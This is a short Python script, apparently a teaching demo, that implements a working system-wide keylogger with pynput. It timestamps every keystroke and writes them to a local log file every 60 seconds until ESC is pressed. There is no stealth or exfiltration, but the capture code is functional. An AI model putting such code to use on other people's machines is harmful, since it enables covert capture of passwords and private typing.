from pynput import keyboard
import datetime
import os
import threading

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "key_log.txt")
LOG_INTERVAL = 60  # seconds

class KeyloggerSimulator:
    def __init__(self, interval=LOG_INTERVAL):
        self.interval = interval
        self.log_data = ""
        self.listener = None
        os.makedirs(LOG_DIR, exist_ok=True)

    def _write_log_to_file(self):
        if self.log_data:
            with open(LOG_FILE, "a", encoding="utf-8") as file:
                file.write(self.log_data)
            self.log_data = ""

    def _report(self):
        self._write_log_to_file()
        timer = threading.Timer(self.interval, self._report)
        timer.daemon = True
        timer.start()

    def _on_press(self, key):
        time_stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            key_data = f"{time_stamp} - {key.char}\n"
        except AttributeError:
            key_data = f"{time_stamp} - {key}\n"
        self.log_data += key_data

        # Stop listener on ESC
        if key == keyboard.Key.esc:
            self._write_log_to_file()
            print("[+] ESC pressed. Exiting keylogger.")
            return False

    def start(self):
        print("[*] Starting Keylogger Simulator...")
        print("[*] Press ESC to stop.\n")
        self._report()
        with keyboard.Listener(on_press=self._on_press) as self.listener:
            self.listener.join()

if __name__ == "__main__":
    logger = KeyloggerSimulator()
    logger.start()
